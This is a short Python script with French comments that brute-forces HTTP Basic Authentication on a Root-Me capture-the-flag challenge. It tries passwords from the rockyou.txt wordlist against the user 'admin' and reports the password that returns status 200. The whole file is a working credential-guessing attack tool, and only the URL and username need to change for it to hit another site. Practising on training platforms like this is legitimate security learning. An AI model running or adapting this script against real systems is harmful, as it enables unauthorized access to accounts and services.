from requests import get
from base64 import b64encode

#URL cible (Root-Me challenge HTTP Auth)
URL = 'http://challenge01.root-me.org/web-serveur/ch3/'
#Nom d'utilisateur à tester
USER = 'admin'
#Dictionnaire de mots de passe
WORDLIST_PATH = "rockyou.txt"
#Nombre maximum de tentatives
MAX_TRIES = 1000

def brute_force(max_tries):
    errors = 0
    fails = 0
    success = False
    found_password = None

    print(f"\n\n   [+] STARTING BRUTEFORCE ON: {URL}\n")

    try:
        with open(WORDLIST_PATH, "r", encoding="latin-1") as f:
            for i in range(max_tries):
                password = f.readline().strip()
                if not password:
                    print("[!] Fin du fichier atteinte.")
                    break

                # Encodage Base64 de "user:password"
                credentials = b64encode(f"{USER}:{password}".encode()).decode()

                try:
                    response = get(URL, headers={"Authorization": f"Basic {credentials}"})
                    status = response.status_code
                    print(f"[+] {status} - Trying: {USER}:{password}")

                    if status == 200:
                        success = True
                        found_password = password
                        print(f"\n[✔] Mot de passe trouvé : {USER}:{password} (essai {i+1})")
                        break
                    else:
                        fails += 1

                except Exception as e:
                    print(f"[!] Erreur lors de la requête : {e}")
                    errors += 1

    except FileNotFoundError:
        print(f"[✘] Le fichier '{WORDLIST_PATH}' est introuvable.")
        return
    except Exception as e:
        print(f"[✘] Erreur inattendue : {e}")
        return

    print("\n\n   [+] FIN DU PROCESSUS\n")
    print(f"   [ERREURS] : {errors}")
    print(f"   [ECHECS]  : {fails}")
    print(f"   [SUCCÈS]  : {'1' if success else '0'}")
    if success:
        print(f"Mot de passe correct : '{found_password}'")

if __name__ == '__main__':
    brute_force(MAX_TRIES)